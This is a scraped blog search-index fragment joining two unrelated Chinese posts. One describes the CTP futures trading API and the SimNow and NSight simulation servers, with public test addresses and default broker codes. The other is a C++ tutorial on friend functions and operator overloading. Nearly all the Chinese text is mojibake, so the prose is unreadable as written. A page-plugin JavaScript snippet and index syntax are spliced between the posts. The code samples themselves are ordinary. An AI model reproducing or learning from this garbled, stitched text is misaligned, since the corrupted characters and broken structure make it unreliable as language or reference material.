å°æ—¶è¿ç»­äº¤æ˜“ï¼Œè¿ç»´äººå‘˜ä¸å¿…æ¯æ—¥å¯åœç³»ç»Ÿï¼Œå¯ä»¥åšåˆ° â€œä¸€é”®è¿ç»´â€ï¼Œè¯¥ç‰¹æ€§ä½¿å¾—ç»¼åˆäº¤æ˜“å¹³å°æ–°å¢äº¤æ˜“ä¸­å¿ƒä»¥æ‰©å±•ä¸šåŠ¡è§„æ¨¡æ—¶ä¸ç”¨å¢åŠ è¿ç»´äººåŠ›çš„æˆæœ¬ã€‚æ”¯æŒ FENS æœºåˆ¶çš„ â€œä¸€é”®åˆ‡æ¢â€ å¤šæ´»äº¤æ˜“ä¸­å¿ƒä¹Ÿæ˜¯ç›®å‰å¸‚åœºä¸Šåªæœ‰ CTP ç³»ç»Ÿå®ç°äº†çš„ç‰¹æ€§ã€‚è¯¥æœºåˆ¶ä½¿å¾—äº¤æ˜“ç³»ç»Ÿå¯åœ¨æŸä¸ªäº¤æ˜“ä¸­å¿ƒå®•æœºçš„æƒ…å†µä¸‹ç«‹å³åˆ‡æ¢åˆ°å¦ä¸€ä¸ªå¤‡ç”¨äº¤æ˜“ä¸­å¿ƒï¼Œå¾—ä»¥å®ç°çœŸçœŸæ­£æ­£çš„è¿ç»­äº¤æ˜“ã€‚ç»¼åˆäº¤æ˜“å¹³å°å…¬å¼€å¹¶å¯¹å¤–å¼€æ”¾äº¤æ˜“ç³»ç»Ÿæ¥å£ï¼Œä½¿ç”¨è¯¥æ¥å£å¯ä»¥æ¥æ”¶äº¤æ˜“æ‰€çš„è¡Œæƒ…æ•°æ®å’Œæ‰§è¡Œäº¤æ˜“æŒ‡ä»¤ã€‚è¯¥æ¥å£é‡‡ç”¨å¼€æ”¾æ¥å£ï¼ˆAPIï¼‰çš„æ–¹å¼æ¥å…¥ï¼Œæ—©å·²åœ¨æœŸè´§ç•Œå·²ç»å½¢æˆäº‹å®ä¸Šçš„è¡Œä¸šæ ‡å‡†ã€‚ CTP APIä» CTP å®˜ç½‘ï¼ˆéäº¤æ˜“æ—¶æ®µç¦æ­¢è®¿é—®ï¼‰å¯ä»¥äº†è§£åˆ°ï¼ŒCTP API ä» v6.3.15 ç‰ˆå¼€å§‹å¼•å…¥å¼ºåˆ¶çœ‹ç©¿å¼è®¤è¯è§„åˆ™ï¼ŒCTP ä¸å†å…¼å®¹ä¹‹å‰çš„ API ç‰ˆæœ¬ã€‚ç›®å‰ï¼ŒCTP API æœ€æ–°ç‰ˆæ˜¯ v6.6.1ï¼Œä¸ v6.3.15 ç›¸æ¯”è¾ƒæœ€å¤§çš„æ”¹åŠ¨æ˜¯ï¼ŒInstrumentID ç”±æœ€é•¿ 30 ä¸ªå­—èŠ‚å¢åŠ åˆ° 80 ä¸ªå­—èŠ‚ã€‚CTP ç”Ÿäº§ç³»ç»Ÿå…¼å®¹ v6.3.15 åŠä»¥ä¸Šç‰ˆæœ¬ã€‚ä½†æ˜¯ï¼Œå¤§éƒ¨åˆ†æœŸè´§å…¬å¸åšçœ‹ç©¿å¼è®¤è¯çš„ä»¿çœŸç³»ç»Ÿè¦æ±‚ä½¿ç”¨æ–°ç‰ˆ API æ‰èƒ½æ¥å…¥ã€‚æ‰€ä»¥ï¼Œæ–°ç”¨æˆ·åšçœ‹ç©¿å¼è®¤è¯æ—¶é¦–å…ˆè¦ç¡®è®¤ API çš„ç‰ˆæœ¬å·ã€‚ CTP ä»¿çœŸç³»ç»ŸSimNow ä»¿çœŸç³»ç»ŸSimNow æ˜¯ä¸ŠæœŸæŠ€æœ¯ä¸ºå¹¿å¤§æŠ•èµ„è€…æ‰“é€ çš„ä¸€ä¸ªæœ€æ¥è¿‘çœŸå®å¸‚åœºç¯å¢ƒçš„ä»¿çœŸå¹³å°ï¼Œä¸»è¦é¢å‘æœŸè´§ç»çºªå…¬å¸å’ŒæŠ•èµ„è€…æœåŠ¡ï¼Œæä¾›æ•´å¥—æœŸè´§äº¤æ˜“çš„ä¿¡æ¯åŒ–æŠ€æœ¯å¹³å°ã€‚SimNow å®˜ç½‘ï¼ˆéäº¤æ˜“æ—¶æ®µç¦æ­¢è®¿é—®ï¼‰ï¼Œäº¤æ˜“è€…æ³¨å†Œ SimNow ä»¿çœŸè´¦æˆ·åï¼Œå¯ä»¥ä½¿ç”¨ä» CTP å®˜ç½‘ä¸‹è½½ API æ¥å…¥è¿™å¥—ä»¿çœŸäº¤æ˜“ç³»ç»Ÿã€‚å¼€å‘ã€æµ‹è¯•å®Œæˆä¹‹åï¼Œåªéœ€è¦æ›´æ¢ç”¨æˆ·åã€å¯†ç ã€å‰ç½®åœ°å€ç­‰ä¿¡æ¯å°±å¯ä»¥æ¥å…¥æœŸè´§å…¬å¸ç”Ÿäº§ç³»ç»Ÿè¿›è¡Œå®ç›˜äº¤æ˜“ã€‚SimNow è¦æ±‚ CTP API çš„ç‰ˆæœ¬æ˜¯ v6.3.15 åŠä»¥ä¸Šæ‰èƒ½å¤Ÿæ¥å…¥ã€‚ è®¤è¯ä¿¡æ¯123BrokerID = "9999"AppID = "SimNow_client_test"AuthCode = "0000000000000000" å€¼å¾—ä¸€æçš„æ˜¯ï¼Œé»˜è®¤çš„ BrokerID ä¸º 9999ï¼ŒAppID ä¸º SimNow_client_testï¼ŒAuthCode ä¸º 0000000000000000ï¼ˆ16ä¸ª0ï¼‰ï¼Œé»˜è®¤ä¸ä¼šå¼€ç»ˆç«¯è®¤è¯ï¼Œç¨‹åºåŒ–ç”¨æˆ·å¯ä»¥é€‰æ‹©ä¸å¼€ç»ˆç«¯è®¤è¯æ¥å…¥ã€‚ ç”Ÿäº§ä»¿çœŸç¯å¢ƒä»¥ä¸‹çš„å‰ç½®åœ°å€ï¼Œäº¤æ˜“æ—¶æ®µä¸çœŸå®ç”Ÿäº§ç¯å¢ƒï¼ˆå®ç›˜ï¼‰ä¸€è‡´ã€‚ ç”µä¿¡ 12FrontAddr=tcp://180.168.146.187:10201FrontMdAddr=tcp://180.168.146.187:10211 ç”µä¿¡ 12FrontAddr=tcp://180.168.146.187:10202FrontMdAddr=tcp://180.168.146.187:10212 ç§»åŠ¨ 12FrontAddr=tcp://218.202.237.33:10203FrontMdAddr=tcp://218.202.237.33:10213 æµ‹è¯•ä»¿çœŸç¯å¢ƒ æ”¯æŒå…¨å¤©äº¤æ˜“ï¼ˆ7x24ï¼‰ï¼Œä¸é—´æ–­è½®æ’­æŸå¤©è¡Œæƒ… SimNow æ–°æ³¨å†Œç”¨æˆ·ï¼Œéœ€è¦ç­‰åˆ°ç¬¬ä¸‰ä¸ªäº¤æ˜“æ—¥æ‰èƒ½ä½¿ç”¨ äº¤æ˜“æ—¶æ®µï¼šäº¤æ˜“æ—¥ 16ï¼š00 ï½ æ¬¡æ—¥ 09ï¼š00ï¼›éäº¤æ˜“æ—¥ 16ï¼š00 ï½ æ¬¡æ—¥ 15ï¼š00 ä»…æœåŠ¡äº CTP API å¼€å‘çˆ±å¥½è€…ï¼Œä»…ä¸ºç”¨æˆ·æä¾› CTP API æµ‹è¯•éœ€æ±‚ï¼Œä¸æä¾›ç»“ç®—ç­‰å…¶å®ƒæœåŠ¡ 12FrontAddr=tcp://180.168.146.187:10130FrontMdAddr=tcp://180.168.146.187:10131 ä»¿çœŸæˆäº¤è§„åˆ™ æœŸè´§äº¤æ˜“æŒ‰ç…§äº¤æ˜“æ‰€å…¬å¸ƒçš„ä¹°ä¸€å–ä¸€ä»·å¯¹ä»·æˆäº¤ ä¹°å…¥æ—¶ï¼šå¦‚æœå§”æ‰˜ä»·å¤§äºç­‰äºå–ä¸€ä»·ï¼Œåˆ™æˆäº¤ï¼Œæˆäº¤ä»·ä¸ºå§”æ‰˜ä»·ã€å–ä¸€ä»·ã€æœ€æ–°ä»·ä¸‰ä»·å–ä¸­ï¼Œå¦‚æœå§”æ‰˜ä»·å°äºå–ä¸€ä»·ï¼Œä¸èƒ½æˆäº¤ï¼Œç­‰å¾…æ›´ä¼˜çš„è¡Œæƒ…æ‰èƒ½æˆäº¤ å–å‡ºæ—¶ï¼šå¦‚æœå§”æ‰˜ä»·å°äºç­‰äºä¹°ä¸€ä»·ï¼Œåˆ™æˆäº¤ï¼Œæˆäº¤ä»·ä¸ºå§”æ‰˜ä»·ã€ä¹°ä¸€ä»·ã€æœ€æ–°ä»·ä¸‰ä»·å–ä¸­ï¼Œå¦‚æœå§”æ‰˜ä»·å¤§äºä¹°ä¸€ä»·ï¼Œä¸èƒ½æˆäº¤ï¼Œç­‰å¾…æ›´ä¼˜çš„è¡Œæƒ…æ‰èƒ½æˆäº¤ ä»¿çœŸäº¤æ˜“æ—¶é—´ NSight ä»¿çœŸç³»ç»Ÿäº¤æ˜“è€…åœ¨ NSight å®˜ç½‘ æ³¨å†Œä»¿çœŸè´¦æˆ·åï¼Œå¯ä»¥ä½¿ç”¨ä» CTP å®˜ç½‘ä¸‹è½½çš„ API v6.3.15 æ¥å…¥è¿™å¥—ä»¿çœŸäº¤æ˜“ç³»ç»Ÿã€‚å¼€å‘ã€æµ‹è¯•å®Œæˆä¹‹åï¼Œåªéœ€è¦æ›´æ¢ç”¨æˆ·åã€å¯†ç ã€å‰ç½®åœ°å€ç­‰ä¿¡æ¯å°±å¯ä»¥æ¥å…¥æœŸè´§å…¬å¸ç”Ÿäº§ç³»ç»Ÿè¿›è¡Œå®ç›˜äº¤æ˜“ã€‚ è®¤è¯ä¿¡æ¯123BrokerID = "10010"AppID = ""AuthCode = "" å€¼å¾—ä¸€æçš„æ˜¯ï¼Œé»˜è®¤çš„ BrokerID ä¸º 10010ï¼ŒAppID ä¸ AuthCode å‡ä¸ºç©ºå­—ç¬¦ä¸²ã€‚ ç”Ÿäº§ä»¿çœŸç¯å¢ƒä»¥ä¸‹çš„å‰ç½®åœ°å€ï¼Œäº¤æ˜“æ—¶æ®µä¸çœŸå®ç”Ÿäº§ç¯å¢ƒï¼ˆå®ç›˜ï¼‰ä¸€è‡´ã€‚ 12FrontAddr=tcp://210.14.72.12:4600FrontMdAddr=tcp://210.14.72.12:4602 æœŸè´§äº¤æ˜“ç»ˆç«¯å¸‚é¢ä¸Šä¸»æµçš„æœŸè´§äº¤æ˜“ç»ˆç«¯å¯ä»¥åœ¨ SimNow å®˜ç½‘ï¼ˆéäº¤æ˜“æ—¶æ®µç¦æ­¢è®¿é—®ï¼‰ä¸‹è½½ã€‚ å¿«æœŸæœŸè´§äº¤æ˜“ç»ˆç«¯å¯¹äºé‡åŒ–äº¤æ˜“è€…ï¼Œåœ¨æ²¡æœ‰è‡ªä¸»å¼€å‘ç›‘æ§å®¢æˆ·ç«¯ä¹‹å‰ï¼Œå¿«æœŸæ˜¯ä¸€ä¸ªå¾ˆä¸é”™çš„é€‰æ‹©ã€‚è¿™é‡Œä»¥ å¿«æœŸ v2 ç‰ˆæœ¬ä¸¾ä¾‹ï¼Œè‹¥ä½¿ç”¨å¿«æœŸç™»å½• SimNow çš„æ¨¡æ‹Ÿè´¦æˆ·ï¼Œåˆ™åªéœ€è¦åœ¨å¿«æœŸçš„ç™»å½•ç•Œé¢é€‰æ‹©æœåŠ¡å™¨ ä¸ŠæœŸæŠ€æœ¯-xx å³å¯ï¼Œä¸‹æ‹‰åˆ—è¡¨é‡Œä¸åŒçš„æœåŠ¡å™¨åˆ†åˆ«ä½¿ç”¨äº†ä¸åŒçš„å‰ç½®åœ°å€ï¼Œè€Œ ç”¨æˆ·ä»£ç  ç›´æ¥å¡«å†™ InvestorIDã€‚ CTP å¼€æ”¾å¹³å° CTP å¼€æ”¾å¹³å° CTP å¼€æ”¾å¹³å°è¿è¡Œç¯å¢ƒç›‘æ§ CTP æ¥å£å…¼å®¹æ¨¡æ‹Ÿäº¤æ˜“å¹³å°ä»‹ç» - ç±»ä¼¼ SimNow å‚è€ƒåšå®¢ CTP API ç‰ˆæœ¬è¯´æ˜ CTP API å„ç‰ˆæœ¬å®˜æ–¹ä¸‹è½½ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é‡åŒ–äº¤æ˜“"},{title:"C++ å…¥é—¨åŸºç¡€ä¹‹å…­",url:"/posts/a54941f5.html",text:'å‹å…ƒå‡½æ•°ç±»çš„å‹å…ƒå‡½æ•°æ˜¯å®šä¹‰åœ¨ç±»çš„å¤–éƒ¨ï¼Œä½†æœ‰æƒè®¿é—®ç±»çš„æ‰€æœ‰ç§æœ‰ï¼ˆprivateï¼‰æˆå‘˜å’Œä¿æŠ¤ï¼ˆprotectedï¼‰æˆå‘˜ã€‚å°½ç®¡å‹å…ƒå‡½æ•°çš„åŸå‹åœ¨ç±»çš„å£°æ˜ä¸­å‡ºç°è¿‡ï¼Œä½†æ˜¯å‹å…ƒå‡½æ•°å¹¶ä¸æ˜¯ç±»çš„æˆå‘˜å‡½æ•°ï¼Œè€Œæ˜¯æ™®é€šå‡½æ•°ï¼ˆå…¨å±€å‡½æ•°ï¼‰ã€‚å¦‚æœè¦å£°æ˜å‡½æ•°ä¸ºä¸€ä¸ªç±»çš„å‹å…ƒï¼Œéœ€è¦åœ¨ç±»å®šä¹‰ä¸­è¯¥å‡½æ•°åŸå‹å‰ä½¿ç”¨å…³é”®å­— friendã€‚ å‹å…ƒå‡½æ•°çš„è§„åˆ™ä¸ºä»€ä¹ˆè¦å¼•å…¥å‹å…ƒå‡½æ•°ï¼š C++ åˆ©ç”¨ friend ä¿®é¥°ç¬¦ï¼Œå¯ä»¥è®©ä¸€äº›è®¾å®šçš„å‡½æ•°èƒ½å¤Ÿå¯¹ä¸€äº›ä¿æŠ¤æ•°æ®è¿›è¡Œè®¿é—®ï¼Œé¿å…æŠŠç±»çš„æˆå‘˜å…¨éƒ¨è®¾ç½®æˆ publicï¼Œæœ€å¤§é™åº¦çš„ä¿æŠ¤æ•°æ®æˆå‘˜çš„å®‰å…¨ã€‚åŒæ—¶å‹å…ƒå‡½æ•°å¯ä»¥å®ç°ç±»ä¹‹é—´çš„æ•°æ®å…±äº«ï¼Œå‡å°‘ç³»ç»Ÿå¼€é”€ï¼Œæé«˜æ•ˆç‡ã€‚ç”±äºå‹å…ƒå‡½æ•°ç ´ç¯äº†å°è£…æœºåˆ¶ï¼Œå› æ­¤æ¨èå°½é‡ä½¿ç”¨æˆå‘˜å‡½æ•°ï¼Œé™¤éä¸å¾—å·²çš„æƒ…å†µä¸‹æ‰ä½¿ç”¨å‹å…ƒå‡½æ•°ã€‚ ä»€ä¹ˆæ—¶å€™ä½¿ç”¨å‹å…ƒå‡½æ•°ï¼š å¤šä¸ªç±»è¦å…±äº«æ•°æ®çš„æ—¶å€™ è¿ç®—ç¬¦é‡è½½çš„æŸäº›åœºåˆéœ€è¦ä½¿ç”¨å‹å…ƒå‡½æ•° å‹å…ƒå‡½æ•°çš„å‚æ•°ï¼š å› ä¸ºå‹å…ƒå‡½æ•°æ²¡æœ‰ this æŒ‡é’ˆï¼Œæ‰€ä»¥å‚æ•°ä¼šæœ‰ä¸‰ç§æƒ…å†µï¼š a) è¦è®¿é—®é static æˆå‘˜æ—¶ï¼Œéœ€è¦å¯¹è±¡åšå‚æ•° b) è¦è®¿é—® static æˆå‘˜æˆ–å…¨å±€å˜é‡æ—¶ï¼Œåˆ™ä¸éœ€è¦å¯¹è±¡åšå‚æ•° c) å¦‚æœåšå‚æ•°çš„å¯¹è±¡æ˜¯å…¨å±€å¯¹è±¡ï¼Œåˆ™ä¸éœ€è¦å¯¹è±¡åšå‚æ•° å‹å…ƒå‡½æ•°çš„ä½ç½®ï¼š å› ä¸ºå‹å…ƒå‡½æ•°æ˜¯ç±»å¤–çš„å‡½æ•°ï¼ˆæ™®é€šå‡½æ•°ï¼‰ï¼Œæ‰€ä»¥å®ƒçš„å£°æ˜å¯ä»¥æ”¾åœ¨ç±»çš„ç§æœ‰æ®µï¼ˆprivateï¼‰æˆ–å…¬æœ‰æ®µï¼ˆpublicï¼‰ï¼Œä¸¤è€…éƒ½æ˜¯æ²¡æœ‰åŒºåˆ«çš„ ä¸€ä¸ªå‡½æ•°å¯ä»¥æ˜¯å¤šä¸ªç±»çš„å‹å…ƒå‡½æ•°ï¼Œåªéœ€è¦åœ¨å„ä¸ªç±»ä¸­åˆ†åˆ«å£°æ˜å³å¯ å‹å…ƒå‡½æ•°çš„è°ƒç”¨ï¼š å¯ä»¥ç›´æ¥è°ƒç”¨å‹å…ƒå‡½æ•°ï¼Œä¸éœ€è¦é€šè¿‡å¯¹è±¡æˆ–æŒ‡é’ˆ å‹å…ƒå‡½æ•°çš„è°ƒç”¨ä¸æ™®é€šå‡½æ•°ï¼ˆå…¨å±€å‡½æ•°ï¼‰çš„è°ƒç”¨æ–¹å¼å’ŒåŸç†ä¸€è‡´ å‹å…ƒå‡½æ•°çš„ä½¿ç”¨123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class A {public: A(int a) { this-&gt;a = a; } int getA() { return this-&gt;a; } // å£°æ˜å‹å…ƒå‡½æ•° friend void update2(A* p);private: int a;};void update1(A* p) { // p-&gt;a = 30; // é”™è¯¯å†™æ³•ï¼Œåœ¨æ™®é€šå‡½æ•°ï¼ˆå…¨å±€å‡½æ•°ï¼‰å†…ï¼Œç§æœ‰æ•°æ®æˆå‘˜ä¸èƒ½åœ¨ç±»å¤–è¢«è®¿é—®}void update2(A* p) { p-&gt;a = 30; // åœ¨å‹å…ƒå‡½æ•°å†…ï¼Œå¯ä»¥é€šè¿‡å¯¹è±¡å‚æ•°è®¿é—®ç§æœ‰æ•°æ®æˆå‘˜}int main() { A* a = new A(10); update2(a); // è°ƒç”¨å‹å…ƒå‡½æ•° cout &lt;&lt; "a = " &lt;&lt; a-&gt;getA() &lt;&lt; endl; delete a; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1a = 30 å‹å…ƒç±»å‹å…ƒç±»çš„æ‰€æœ‰æˆå‘˜å‡½æ•°éƒ½æ˜¯å¦ä¸€ä¸ªç±»çš„å‹å…ƒå‡½æ•°ï¼Œéƒ½å¯ä»¥è®¿é—®å¦ä¸€ä¸ªç±»ä¸­çš„ç§æœ‰ï¼ˆprivateï¼‰æˆå‘˜å’Œä¿æŠ¤ï¼ˆprotectedï¼‰æˆå‘˜ã€‚å½“å¸Œæœ›ä¸€ä¸ªç±»å¯ä»¥è®¿é—®å¦ä¸€ä¸ªç±»çš„ä¿æŠ¤æ•°æ®æ—¶ï¼Œå¯ä»¥å°†è¯¥ç±»å£°æ˜ä¸ºå¦ä¸€ç±»çš„å‹å…ƒç±»ã€‚å®šä¹‰å‹å…ƒç±»çš„è¯­æ³•æ ¼å¼ä¸º friend class ç±»å;ï¼Œå…¶ä¸­ç±»åå¿…é¡»æ˜¯ç¨‹åºä¸­çš„ä¸€ä¸ªå·²å®šä¹‰è¿‡çš„ç±»ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå‹å…ƒç±»é€šå¸¸è®¾è®¡ä¸ºä¸€ç§å¯¹æ•°æ®æ“ä½œæˆ–ç±»ä¹‹é—´ä¼ é€’æ¶ˆæ¯çš„è¾…åŠ©ç±»ã€‚ å‹å…ƒç±»çš„è§„åˆ™ å‹å…ƒå…³ç³»ä¸èƒ½è¢«ç»§æ‰¿ å‹å…ƒå…³ç³»æ˜¯å•å‘çš„ï¼Œä¸å…·æœ‰äº¤æ¢æ€§ã€‚è‹¥ç±» B æ˜¯ç±» A çš„å‹å…ƒï¼Œåˆ™ç±» A ä¸ä¸€å®šæ˜¯ç±» B çš„å‹å…ƒï¼Œè¦çœ‹åœ¨ç±» B ä¸­æ˜¯å¦æœ‰ç›¸åº”çš„å£°æ˜ å‹å…ƒå…³ç³»ä¸å…·æœ‰ä¼ é€’æ€§ï¼Œè‹¥ç±» B æ˜¯ç±» A çš„å‹å…ƒï¼Œç±» C æ˜¯ ç±» B çš„å‹å…ƒï¼Œåˆ™ç±» C ä¸ä¸€å®šæ˜¯ç±» A çš„å‹å…ƒï¼Œè¦çœ‹ç±» A ä¸­æ˜¯å¦æœ‰ç›¸åº”çš„å£°æ˜ å‹å…ƒç±»çš„ä½¿ç”¨1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;using namespace std;class A {public: // å£°æ˜å‹å…ƒç±» B friend class B; void print() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class B {public: void setValue(int a) { aObj.a = a; // ç±» B æ˜¯ç±» A çš„å‹å…ƒç±»ï¼Œå› æ­¤ B ç±»çš„æ‰€æœ‰æˆå‘˜å‡½æ•°éƒ½å¯ä»¥è®¿é—® A ç±»çš„ç§æœ‰æˆå‘˜æˆ–è€…ä¿æŠ¤æˆå‘˜ } void print() { aObj.print(); }private: A aObj;};int main() { B b; b.setValue(100); b.print(); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1a = 100 è¿ç®—ç¬¦é‡è½½åŸºç¡€æ‰€è°“é‡è½½ï¼Œå°±æ˜¯é‡æ–°èµ‹äºˆæ–°çš„å«ä¹‰ã€‚å‡½æ•°é‡è½½å°±æ˜¯å¯¹ä¸€ä¸ªå·²æœ‰çš„å‡½æ•°èµ‹äºˆæ–°çš„å«ä¹‰ï¼Œä½¿ä¹‹å®ç°æ–°åŠŸèƒ½ï¼Œå› æ­¤ï¼Œä¸€ä¸ªå‡½æ•°åå°±å¯ä»¥ç”¨æ¥ä»£è¡¨ä¸åŒåŠŸèƒ½çš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ ä¸€åå¤šç”¨ã€‚è¿ç®—ç¬¦ä¹Ÿå¯ä»¥é‡è½½ï¼Œå®é™…ä¸Šï¼Œå¼€å‘è€…å·²ç»åœ¨ä¸çŸ¥ä¸è§‰ä¹‹ä¸­ä½¿ç”¨äº†è¿ç®—ç¬¦é‡è½½ã€‚ä¾‹å¦‚ï¼Œå¤§å®¶éƒ½å·²ä¹ æƒ¯äºç”¨åŠ æ³•è¿ç®—ç¬¦ + å¯¹æ•´æ•°ã€å•ç²¾åº¦æ•°å’ŒåŒç²¾åº¦æ•°è¿›è¡ŒåŠ æ³•è¿ç®—ï¼Œå¦‚ 5 + 8ï¼Œ5.8 + 3.67 ç­‰ï¼Œå…¶å®è®¡ç®—æœºå¯¹æ•´æ•°ã€å•ç²¾åº¦æ•°å’ŒåŒç²¾åº¦æ•°çš„åŠ æ³•æ“ä½œè¿‡ç¨‹æ˜¯å¾ˆä¸ç›¸åŒçš„ï¼Œä½†ç”±äº C++ å·²ç»å¯¹è¿ç®—ç¬¦ + è¿›è¡Œäº†é‡è½½ï¼Œæ‰€ä»¥å°±èƒ½é€‚ç”¨äº intã€floatã€doUble ç±»å‹çš„è¿ç®—ã€‚åˆå¦‚ &lt;&lt; æ˜¯ C++ çš„ä½è¿ç®—ä¸­çš„ä½ç§»è¿ç®—ç¬¦ï¼ˆå·¦ç§»ï¼‰ï¼Œä½†åœ¨è¾“å‡ºæ“ä½œä¸­åˆæ˜¯ä¸æµå¯¹è±¡ cout é…åˆä½¿ç”¨çš„æµæ’å…¥è¿ç®—ç¬¦ã€‚&gt;&gt; ä¹Ÿæ˜¯ä½ç§»è¿ç®—ç¬¦ (å³ç§»ï¼‰ï¼Œä½†åœ¨è¾“å…¥æ“ä½œä¸­åˆæ˜¯ä¸æµå¯¹è±¡ cin é…åˆä½¿ç”¨çš„æµæå–è¿ç®—ç¬¦ã€‚è¿™å°±æ˜¯è¿ç®—ç¬¦é‡è½½ (Operator Overloading)ã€‚C++ ç³»ç»Ÿå¯¹ &lt;&lt; å’Œ &gt;&gt; è¿›è¡Œäº†é‡è½½ï¼Œç”¨æˆ·åœ¨ä¸åŒçš„åœºåˆä¸‹ä½¿ç”¨å®ƒä»¬æ—¶ï¼Œä½œç”¨æ˜¯ä¸åŒçš„ã€‚å¯¹ &lt;&lt; å’Œ &gt;&gt; çš„é‡è½½å¤„ç†æ˜¯æ”¾åœ¨å¤´æ–‡ä»¶ stream ä¸­çš„ã€‚å› æ­¤ï¼Œå¦‚æœè¦åœ¨ç¨‹åºä¸­ç”¨ &lt;&lt; å’Œ &gt;&gt; ä½œæµæ’å…¥è¿ç®—ç¬¦å’Œæµæå–è¿ç®—ç¬¦ï¼Œå¿…é¡»åœ¨æœ¬æ–‡ä»¶æ¨¡å—ä¸­åŒ…å«å¤´æ–‡ä»¶ streamï¼Œå½“ç„¶è¿˜åº”å½“åŒ…æ‹¬å‘½åç©ºé—´çš„ä½¿ç”¨å£°æ˜ using namespace stdã€‚ è¿ç®—ç¬¦é‡è½½çš„è¯­æ³• ä¾‹å¦‚ï¼š ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°å®Œæˆ "-" è¿ç®—ç¬¦é‡è½½çš„è¯­æ³•ï¼šComplex operator-(Complex &amp;c2) ä½¿ç”¨å‹å…ƒå‡½æ•°å®Œæˆ "+" è¿ç®—ç¬¦é‡è½½çš„è¯­æ³•ï¼šComplex operator+(Complex &amp;c1, Complex &amp;c2) è¿ç®—ç¬¦é‡è½½çš„é™åˆ¶ è¿ç®—ç¬¦é‡è½½çš„ä¸¤ç§æ–¹å¼ å‰ç½®ä¸åç½®è¿ç®—ç¬¦é‡è½½è§„åˆ™åœ¨ C++ ä¸­æ˜¯é€šè¿‡ä¸€ä¸ªå ä½å‚æ•°ï¼ˆintï¼‰æ¥åŒºåˆ†å‰ç½®è¿ç®—ç¬¦å’Œåç½®è¿ç®—ç¬¦çš„é‡è½½ï¼Œä¾‹å¦‚ ++aã€a++ã€--bã€b--ã€‚ è¿ç®—ç¬¦é‡è½½çš„ç®€å•ä½¿ç”¨æ¡ˆä¾‹äºŒå…ƒè¿ç®—ç¬¦é‡è½½åœ¨ä¸‹è¿°çš„æ¡ˆä¾‹ä¸­ï¼Œæ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°å’Œå‹å…ƒå‡½æ•°å®ç°äºŒå…ƒè¿ç®—ç¬¦çš„é‡è½½ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œé™¤äº†ä½¿ç”¨å‹å…ƒå‡½æ•°å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å…¨å±€å‡½æ•°ï¼ˆæ™®é€šå‡½æ•°ï¼‰æ¥å®ç°è¿ç®—ç¬¦çš„é‡è½½ï¼Œä¸åŒçš„æ˜¯ä½¿ç”¨å‹å…ƒå‡½æ•°æ›´æ–¹ä¾¿ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ç±»çš„æ‰€æœ‰ç§æœ‰ï¼ˆprivateï¼‰æˆå‘˜å’Œä¿æŠ¤ï¼ˆprotectedï¼‰æˆå‘˜ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;using namespace std;class Complex {private: int a; int b;public: Complex(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; } void print() { cout &lt;&lt; "a=" &lt;&lt; this-&gt;a &lt;&lt; ", b=" &lt;&lt; this-&gt;b &lt;&lt; endl; }public: // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°å®Œæˆ "-" è¿ç®—ç¬¦çš„é‡è½½ Complex operator-(Complex&amp; c2) { Complex c3(this-&gt;a - c2.a, this-&gt;b - c2.b); return c3; } // å£°æ˜ç”¨äº "+" è¿ç®—ç¬¦é‡è½½çš„å‹å…ƒå‡½æ•° friend Complex operator+(Complex&amp; c1, Complex&amp; c2);};// å®šä¹‰å‹å…ƒå‡½æ•°å®Œæˆ "+" è¿ç®—ç¬¦çš„é‡è½½Complex operator+(Complex&amp; c1, Complex&amp; c2) { Complex c3(c1.a + c2.a, c1.b + c2.b); return c3;}int main() { Complex c1(1, 2), c2(3, 4); // ç›´æ¥è°ƒç”¨å‹å…ƒå‡½æ•° Complex c3 = operator+(c1, c2); c3.print(); // ä½¿ç”¨å‹å…ƒå‡½æ•°å®Œæˆ "+" è¿ç®—ç¬¦çš„é‡è½½ Complex c4 = c1 + c2; c4.print(); // ç›´æ¥è°ƒç”¨ç±»æˆå‘˜å‡½æ•° Complex c5 = c1.operator-(c2); c5.print(); // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°å®Œæˆ "-" è¿ç®—ç¬¦çš„é‡è½½ Complex c6 = c1 - c2; c6.print(); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1234a=4, b=6a=4, b=6a=-2, b=-2a=-2, b=-2 